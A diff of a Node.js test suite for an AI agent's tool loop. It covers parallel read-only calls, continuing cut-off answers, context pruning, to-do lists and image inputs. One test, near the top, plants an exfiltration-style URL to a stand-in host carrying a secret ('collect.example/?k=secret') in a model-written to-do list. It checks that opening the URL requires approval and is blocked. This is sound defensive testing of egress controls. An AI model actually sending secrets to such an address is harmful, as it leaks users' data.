@@ -2,7 +2,7 @@
 
 const test = require('node:test');
 const assert = require('node:assert/strict');
-const { createToolLoop } = require('../lib/tool-loop.cjs');
+const { createToolLoop, pruneToolResults, contextBudget, CONTINUE_NOTE, CUT_CALL_NOTE } = require('../lib/tool-loop.cjs');
 
 const DEFAULT_TOOLS = [
   { fn: 'mcp_fake_echo', serverId: 'fake', toolName: 'echo', readOnly: true },
@@ -839,6 +839,18 @@ test('a tool that repeats the model\'s own address back cannot make it "given"',
   assert.deepEqual(echo.opened, []);
 });
 
+test('an address in the carried to-do list (model-written) asks, even though it is in the instructions', async () => {
+  const source = webSource();
+  const ask = approver(['deny']);
+  const input = { ...INPUT, systemPrompt: 'Your to-do list from your previous reply:\n- [ ] Verify at https://collect.example/?k=secret' };
+  await createToolLoop({
+    provider: fakeProvider([toolReply([open('c1', 'https://collect.example/?k=secret')]), textReply('Done.')]),
+    mcp: fakeMcp(), approve: ask.approve,
+  }).send(input, { permission: 'basic', source, modelWritten: ['Verify at https://collect.example/?k=secret'] });
+  assert.deepEqual(ask.requests.map((request) => [request.reason, request.host]), [['egress', 'collect.example']]);
+  assert.deepEqual(source.opened, []);
+});
+
 test('an address that cannot be read asks, padded or not', async () => {
   const source = webSource();
   const ask = approver(['deny', 'deny']);
@@ -1005,4 +1017,204 @@ test('an MCP tool only labelled read-only asks in basic and is asked about, not 
   const [lookup, add] = toolMessages(provider.calls.complete[1]).map((message) => message.content);
   assert.equal(lookup, 'ok:lookup');
   assert.match(add, /^Error: this reply is in Plan permission/);
+});
+
+// ---- Phase 7: parallel reads, cut-off answers, a long reply's context, to-do lists ------
+
+function slowSource({ delay = 60, readOnly = true, extra = {} } = {}) {
+  const started = [];
+  let running = 0;
+  let most = 0;
+  return {
+    started,
+    most: () => most,
+    async chatTools() {
+      return {
+        tools: ['read', 'todo_write'].map((name) => ({ type: 'function', function: { name, parameters: { type: 'object', properties: {} } } })),
+        resolve: (name) => (name === 'read' ? { serverId: 'Workspace', toolName: 'read_file', readOnly, ...extra }
+          : name === 'todo_write' ? { serverId: 'Todos', toolName: 'todo_write', readOnly: true, exclusive: true } : null),
+        errors: [],
+      };
+    },
+    async callTool(input) {
+      if (input.name === 'todo_write') return { text: 'updated', todos: input.arguments.todos };
+      started.push(input.arguments.path);
+      running += 1;
+      most = Math.max(most, running);
+      await new Promise((resolve) => setTimeout(resolve, input.arguments.delay ?? delay));
+      running -= 1;
+      return { text: `contents of ${input.arguments.path}` };
+    },
+  };
+}
+const read = (id, path, extra = {}) => toolCall(id, 'read', JSON.stringify({ path, ...extra }));
+
+test('read-only calls of one round run side by side and answer in the order the model wrote them', async () => {
+  const source = slowSource();
+  const provider = fakeProvider([
+    // The first finishes last; results and steps still follow the model's order.
+    toolReply([read('c1', 'a.js', { delay: 90 }), read('c2', 'b.js', { delay: 10 }), read('c3', 'c.js', { delay: 40 })]),
+    textReply('Done.'),
+  ]);
+  const began = Date.now();
+  const result = await createToolLoop({ provider, mcp: fakeMcp() }).send({ ...INPUT }, { permission: 'basic', source });
+  assert.ok(Date.now() - began < 200, 'about as long as the slowest read, not the sum');
+  assert.equal(source.most(), 3);
+  assert.deepEqual(toolMessages(provider.calls.complete[1]).map((message) => message.content), ['contents of a.js', 'contents of b.js', 'contents of c.js']);
+  assert.deepEqual(toolMessages(provider.calls.complete[1]).map((message) => message.tool_call_id), ['c1', 'c2', 'c3']);
+  assert.deepEqual(result.toolCalls.map((call) => call.preview), ['contents of a.js', 'contents of b.js', 'contents of c.js']);
+});
+
+test('calls that ask, change something or keep the to-do list stay one at a time', async () => {
+  // Manual asks about every call, so nothing runs side by side.
+  const manual = slowSource({ delay: 5 });
+  const ask = approver(['once', 'once']);
+  await createToolLoop({ provider: fakeProvider([toolReply([read('c1', 'a'), read('c2', 'b')]), textReply('Done.')]), mcp: fakeMcp(), approve: ask.approve })
+    .send({ ...INPUT }, { permission: 'manual', source: manual });
+  assert.equal(manual.most(), 1);
+  // A changing tool (here: read-only false, in Bypass) runs alone too.
+  const changing = slowSource({ delay: 5, readOnly: false });
+  await createToolLoop({ provider: fakeProvider([toolReply([read('c1', 'a'), read('c2', 'b')]), textReply('Done.')]), mcp: fakeMcp() })
+    .send({ ...INPUT, requestId: 'r2' }, { ...BYPASS, source: changing });
+  assert.equal(changing.most(), 1);
+});
+
+test('an answer cut off at the output limit is continued, and the pieces make one answer', async () => {
+  const provider = fakeProvider([
+    textReply('The first half, ', { finishReason: 'length' }),
+    textReply('then the second half.'),
+  ]);
+  const result = await createToolLoop({ provider, mcp: fakeMcp() }).send({ ...INPUT }, BYPASS);
+  assert.equal(result.text, 'The first half, then the second half.');
+  const second = provider.calls.complete[1].messages;
+  assert.deepEqual(second.slice(-2), [{ role: 'assistant', content: 'The first half, ' }, { role: 'user', content: CONTINUE_NOTE }]);
+  // At most twice: a model that never finishes still ends.
+  const endless = fakeProvider([textReply('more ', { finishReason: 'length' })]);
+  const ended = await createToolLoop({ provider: endless, mcp: fakeMcp() }).send({ ...INPUT, requestId: 'r2' }, BYPASS);
+  assert.equal(ended.text, 'more more more ');
+  assert.equal(endless.calls.complete.length, 3);
+});
+
+test('a tool call cut off at the output limit is explained to the model, not called invalid', async () => {
+  const provider = fakeProvider([
+    toolReply([toolCall('c1', 'mcp_fake_echo', '{"text":"a very long fil')], { finishReason: 'length' }),
+    textReply('Done.'),
+  ]);
+  const mcp = fakeMcp();
+  await createToolLoop({ provider, mcp }).send({ ...INPUT }, BYPASS);
+  assert.equal(mcp.calls.callTool.length, 0);
+  assert.equal(toolMessages(provider.calls.complete[1])[0].content, CUT_CALL_NOTE);
+});
+
+test('in a cut-off reply only the last call is held back, even when its arguments parse', async () => {
+  const provider = fakeProvider([
+    toolReply([toolCall('c1', 'mcp_fake_echo', '{"text":"whole"}'), toolCall('c2', 'mcp_fake_echo', '')], { finishReason: 'length' }),
+    textReply('Done.'),
+  ]);
+  const mcp = fakeMcp();
+  await createToolLoop({ provider, mcp }).send({ ...INPUT }, BYPASS);
+  assert.equal(mcp.calls.callTool.length, 1, 'the complete first call ran');
+  const results = toolMessages(provider.calls.complete[1]);
+  assert.notEqual(results[0].content, CUT_CALL_NOTE);
+  assert.equal(results[1].content, CUT_CALL_NOTE);
+});
+
+test('an empty reply to "continue where you stopped" ends with the answer so far, its usage counted', async () => {
+  const empty = Object.assign(new Error('The model finished without an answer'), { code: 'EMPTY_REPLY', usage: { prompt_tokens: 5, completion_tokens: 7, total_tokens: 12 } });
+  const provider = fakeProvider([
+    textReply('The whole answer.', { finishReason: 'length', usage: { prompt_tokens: 10, completion_tokens: 3, total_tokens: 13 } }),
+    () => { throw empty; },
+  ]);
+  const result = await createToolLoop({ provider, mcp: fakeMcp() }).send({ ...INPUT }, BYPASS);
+  assert.equal(result.text, 'The whole answer.');
+  assert.deepEqual(result.usage, { prompt_tokens: 15, completion_tokens: 10, total_tokens: 25 });
+});
+
+test('a long reply shortens its oldest tool results to stay within the context, never the latest', () => {
+  const big = 'x'.repeat(50_000);
+  const chat = [{ role: 'system', content: 'rules' }, { role: 'user', content: 'go' }];
+  for (let round = 1; round <= 5; round += 1) {
+    chat.push({ role: 'assistant', content: null, tool_calls: [{ id: `c${round}`, type: 'function', function: { name: 'read', arguments: '{}' } }] });
+    chat.push({ role: 'tool', tool_call_id: `c${round}`, content: `round ${round} ${big}` });
+  }
+  const pruned = pruneToolResults(chat, 150_000);
+  assert.ok(pruned >= 2);
+  const tools = chat.filter((message) => message.role === 'tool');
+  assert.match(tools[0].content, /^round 1 x+\n\[ScaleMax shortened this earlier tool result/);
+  // The last two rounds are whole, and the total now fits.
+  assert.equal(tools[4].content.length, `round 5 ${big}`.length);
+  assert.equal(tools[3].content.length, `round 4 ${big}`.length);
+  const size = chat.reduce((total, message) => total + Buffer.byteLength(message.content || ''), 0);
+  assert.ok(size <= 150_000, `${size}`);
+  // The budget follows the model's context window, capped by the request limit.
+  assert.equal(contextBudget({ model: 'm', models: [{ id: 'm', contextWindow: 100_000 }] }), 100_000 * 3 * 0.6);
+  assert.equal(contextBudget({ model: 'm', models: [{ id: 'm', contextWindow: 10_000_000 }] }), 3 * 1024 * 1024);
+  assert.equal(contextBudget(null), 3 * 1024 * 1024);
+});
+
+test('a picture counts as a share of the context, not its bytes; old thinking goes before results', () => {
+  const picture = { type: 'image_url', image_url: { url: `data:image/png;base64,${'A'.repeat(1_000_000)}` } };
+  const result = 'r'.repeat(20_000);
+  const round = (id, reasoning) => [
+    { role: 'assistant', content: null, reasoning_content: reasoning, tool_calls: [{ id, type: 'function', function: { name: 'read', arguments: '{}' } }] },
+    { role: 'tool', tool_call_id: id, content: result },
+  ];
+  // A 1 MB picture in a 100 KB budget: nothing needs shortening.
+  const withPicture = [{ role: 'user', content: [{ type: 'text', text: 'look' }, picture] }, ...round('a', 'think'), ...round('b', 'think'), ...round('c', 'think')];
+  assert.equal(pruneToolResults(withPicture, 100_000), 0);
+  assert.equal(withPicture.filter((message) => message.pruned).length, 0);
+  // Long thinking of the oldest round is dropped first; the results stay whole when that is enough.
+  const thinking = [{ role: 'user', content: 'go' }, ...round('a', 't'.repeat(60_000)), ...round('b', 'short'), ...round('c', 'short')];
+  assert.equal(pruneToolResults(thinking, 100_000), 0);
+  assert.equal('reasoning_content' in thinking[1], false);
+  assert.equal(thinking[3].reasoning_content, 'short');
+  assert.equal(thinking[2].content.length, result.length);
+  // Pictures over the request size limit shorten old results even when the context has room.
+  const heavy = [{ role: 'user', content: [{ type: 'text', text: 'look' }, picture, picture, picture] }, ...round('a', ''), ...round('b', ''), ...round('c', '')];
+  heavy[2].content = 'z'.repeat(800_000);
+  assert.equal(pruneToolResults(heavy, 3 * 1024 * 1024), 1);
+  assert.equal(heavy[2].pruned, true);
+});
+
+test('the to-do list the model keeps is reported live and returned with the reply', async () => {
+  const source = slowSource({ delay: 1 });
+  const events = [];
+  const todos = [{ content: 'Read the parser', status: 'completed' }, { content: 'Add the test', status: 'in_progress' }, { content: 'Run the tests', status: 'pending' }];
+  const provider = fakeProvider([toolReply([toolCall('c1', 'todo_write', JSON.stringify({ todos }))]), textReply('Working on it.')]);
+  const result = await createToolLoop({ provider, mcp: fakeMcp() }).send({ ...INPUT }, { permission: 'plan', source, onProgress: (event) => events.push(event) });
+  assert.deepEqual(result.todos, todos);
+  assert.deepEqual(events.find((event) => event.phase === 'todos').items, todos);
+});
+
+test('a provider retry mid-stream is passed on as its own event, and thinking goes back with tool calls', async () => {
+  const events = [];
+  const provider = fakeProvider([
+    (request) => request,
+  ]);
+  // A provider that streams a piece, reports a retry, then answers with a tool call and thinking.
+  let round = 0;
+  provider.complete = async (request, { onDelta } = {}) => {
+    provider.calls.complete.push(structuredClone(request));
+    round += 1;
+    if (round === 1) {
+      onDelta?.({ type: 'text', text: 'Half' });
+      onDelta?.({ type: 'retry', attempt: 1 });
+      return { content: null, toolCalls: [toolCall('c1', 'mcp_fake_echo', '{}')], reasoning: 'Check the echo first.', model: 'm1', finishReason: 'tool_calls' };
+    }
+    return textReply('Done.');
+  };
+  await createToolLoop({ provider, mcp: fakeMcp() }).send({ ...INPUT }, { ...BYPASS, onProgress: (event) => events.push(event) });
+  assert.ok(events.some((event) => event.phase === 'retry' && event.attempt === 1));
+  const assistant = provider.calls.complete[1].messages.find((message) => message.role === 'assistant');
+  assert.equal(assistant.reasoning_content, 'Check the echo first.');
+});
+
+test('a user message may carry picture parts', async () => {
+  const provider = fakeProvider([textReply('A red square.')]);
+  const picture = { type: 'image_url', image_url: { url: 'data:image/png;base64,iVBORw0KGgo=' } };
+  const result = await createToolLoop({ provider, mcp: fakeMcp() }).send({
+    ...INPUT, messages: [{ role: 'user', content: [{ type: 'text', text: 'What is this?' }, picture] }],
+  }, BYPASS);
+  assert.equal(result.text, 'A red square.');
+  assert.deepEqual(provider.calls.complete[0].messages.at(-1).content, [{ type: 'text', text: 'What is this?' }, picture]);
 });
